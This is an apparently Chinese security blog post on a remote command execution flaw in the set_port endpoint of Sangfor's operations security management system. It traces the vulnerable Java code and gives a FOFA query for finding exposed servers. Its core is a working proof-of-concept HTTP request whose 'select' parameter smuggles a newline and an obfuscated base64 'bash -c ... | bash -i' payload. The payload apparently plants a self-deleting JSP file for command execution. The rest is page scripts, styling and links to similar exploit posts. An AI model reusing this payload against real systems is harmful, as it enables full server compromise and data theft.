---
title: "深信服运维安全管理系统 set_port 远程命令执行漏洞"
source: https://mrxn.net/jswz/sangfor-osm-system-netConfig-set_port-rce.html
asset_dir: assets/深信服运维安全管理系统-set_port-远程命令执行漏洞
---

# 深信服运维安全管理系统 set\_port 远程命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/11/19 09:20
* 1017浏览
* [0评论](#comment)
* 29分钟阅读

深入探索

服务器

firewall

防火墙


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

深信服运维安全管理系统 set\_port 接口存在远程[命令执行](https://mrxn.net/tag/rce)漏洞。攻击者可通过构造恶意的请求，利用该漏洞在目标服务器上执行任意命令，从而可能导致服务器被完全控制、敏感数据泄露等严重后果。

# 影响版本

低于 3.0.12 20241106

# fofa语法

> body="/fort/login" && header="FORTSESSIONID"

# 漏洞分析

深入探索

网络安全会议

物流软件安全

Docker加速服务

看下 `com.sbr.fort.web.controller.system.netconfig.NetConfigController#setPort()`的实现逻辑

[![深信服运维安全管理系统 set_port 远程命令执行漏洞](images/img-001-1315e144877c.webp)](https://image.mrxn.net/a08df05b781e4e79a747391cd8493437.webp)

两个参数**select**与**Unselect**被带入**setPort**方法，跟进`setPort`方法看下它的实现逻辑

[![深信服运维安全管理系统 set_port 远程命令执行漏洞](images/img-002-bb4b3bbf7f57.webp)](https://image.mrxn.net/6f1880b419b5470eab3baeb4d5bfd8ae.webp)

首先将`selectedPort`即参数**select直接写入`/usr/local/bin/sh/firewall.sh`** 脚本文件里，然后再将两个参数的值按照逗号分割后，分别拼接进iptables语句中，然后写入`/usr/local/bin/sh/firewall.sh` 脚本文件里，

[![深信服运维安全管理系统 set_port 远程命令执行漏洞](images/img-003-60f95ecb796e.webp)](https://image.mrxn.net/e2f29cae80f64a0b9950a8ebb8b7ec04.webp)

然后调用`ShellExecutor`类的`exe`方法进行执行shell脚本，从而造成[命令执行](https://mrxn.net/tag/rce)漏洞（两个参数均存在命令执行漏洞）。

# 漏洞复现

[![深信服运维安全管理系统 set_port 远程命令执行漏洞](images/img-004-788e654dca5b.webp)](https://image.mrxn.net/10424b4d902246808b34a079f0ac6837.webp)

## POC

### ssh

```
POST /fort/system;help/netConfig/set_port HTTP/1.1
Host: osm.mrxn.net
Content-Type: application/x-www-form-urlencoded

select=6379+-j+DROP%0a%62%61%73%68%20%2d%63%20%24%28%65%63%68%6f%20%5a%57%4e%6f%62%79%41%69%55%45%4e%56%5a%32%46%74%52%6a%4a%5a%55%7a%56%77%59%6e%6b%31%53%6d%4a%75%51%6a%46%6b%52%6b%34%77%59%32%31%57%61%47%4a%54%51%6e%42%69%61%55%45%35%53%55%5a%4b%4d%57%4a%75%55%6e%42%69%56%31%56%31%57%6a%4a%57%4d%46%56%75%56%6e%56%6b%52%32%78%30%57%6c%4e%6e%63%45%78%74%56%6a%52%61%56%30%31%76%59%32%31%57%65%47%52%58%56%6e%70%6b%51%7a%56%75%57%6c%68%53%55%56%6c%59%53%6d%68%69%56%31%59%77%57%6c%68%4a%62%30%6c%74%54%6e%52%61%51%30%6c%77%53%31%4d%31%62%6c%70%59%55%6b%70%69%62%6b%49%78%5a%45%5a%4f%4d%47%4e%74%56%6d%68%69%55%32%64%77%54%7a%4a%73%64%57%52%44%51%6d%68%4a%52%44%42%6e%54%46%52%46%4e%31%6c%75%62%44%42%61%56%6e%52%6b%53%55%64%4a%5a%31%42%54%51%6e%56%61%57%47%4e%6e%57%57%35%73%4d%46%70%57%63%33%6c%4e%52%46%45%30%57%46%52%30%64%6d%52%59%55%58%56%6a%53%45%70%77%59%6d%35%52%62%30%6c%71%65%48%64%6a%62%56%55%72%53%57%6c%72%4e%32%51%79%61%48%42%69%52%31%56%76%53%30%64%46%4f%57%46%58%4e%48%56%6a%62%56%5a%6f%57%6b%4e%6f%61%55%74%54%61%32%68%51%55%7a%42%34%53%31%68%30%64%6d%52%59%55%58%56%6a%53%45%70%77%59%6d%35%53%63%32%4a%70%61%48%56%61%57%47%4e%6e%56%54%4e%53%65%57%46%58%4e%57%35%4c%52%30%6c%7a%54%55%4e%34%61%45%74%54%61%7a%64%6d%56%7a%6b%78%5a%45%4d%31%64%32%4e%74%62%48%56%6b%51%32%64%70%55%45%4d%35%64%32%4e%74%56%53%74%4a%61%57%73%33%59%6d%31%57%4d%30%6c%48%63%47%68%6b%62%55%56%31%59%56%63%34%64%56%4a%74%62%48%4e%61%55%32%68%6f%59%30%68%43%63%32%46%58%54%6d%68%6b%52%32%78%32%59%6d%6b%31%62%6c%70%59%55%6c%4e%61%56%30%5a%7a%56%55%64%47%4d%47%46%44%61%48%6c%61%57%45%59%78%57%6c%68%4f%4d%45%78%74%5a%47%78%6b%52%6b%35%73%59%32%35%61%63%31%70%59%55%6c%46%5a%57%46%4a%76%53%30%4e%72%63%45%74%54%4e%57%74%61%56%33%68%73%5a%45%64%56%62%30%74%55%63%32%78%51%5a%7a%30%39%49%69%42%38%59%6d%46%7a%5a%54%59%30%49%43%31%6b%49%44%34%67%4c%33%56%7a%63%69%39%73%62%32%4e%68%62%43%39%30%62%32%31%6a%59%58%51%76%64%32%56%69%59%58%42%77%63%79%39%6d%62%33%4a%30%4c%33%52%79%64%58%4e%30%4c%33%5a%6c%63%6e%4e%70%62%32%34%76%62%47%39%6e%4c%6d%70%7a%63%41%3d%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%20%2d%69%29%0d%0a%65%78%69%74%3b%0d%0aecho&Unselect=22,443,9443
```

访问 `/fort/trust/version/log.jsp` 文件

[![深信服运维安全管理系统 set_port 远程命令执行漏洞](images/img-005-2ae9a1565d0f.webp)](https://image.mrxn.net/9624f20ff0f94c47b549da7127bdeb0a.webp)

成功[执行命令](https://mrxn.net/tag/rce)，并删除自身

# 参考

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.POC](#toc-5-1-)
* [5.1.1.ssh](#toc-5-1-1-)
* [6.参考](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[深信服运维安全管理系统 set\_port 远程命令执行漏洞](https://mrxn.net/jswz/sangfor-osm-system-netConfig-set_port-rce.html)  
文章链接：<https://mrxn.net/jswz/sangfor-osm-system-netConfig-set_port-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sangfor-osm-system-netConfig-set\_port-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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